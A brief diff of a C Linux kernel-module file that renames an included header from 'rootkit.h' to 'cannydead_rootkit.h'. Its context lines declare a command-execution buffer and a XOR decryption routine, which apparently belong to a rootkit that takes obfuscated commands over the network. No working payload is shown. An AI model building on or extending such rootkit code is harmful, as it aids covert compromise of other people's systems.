@@ -5,7 +5,7 @@
 #include <linux/string.h>
 #include <net/net_namespace.h>
 #include <linux/skbuff.h>
-#include "rootkit.h"
+#include "cannydead_rootkit.h"
 
 extern char exec_cmd_buffer[1976];
 extern void simple_xor_decrypt(char *out_buf, const unsigned char *in_buf, int data_len, __be32 xor_key);
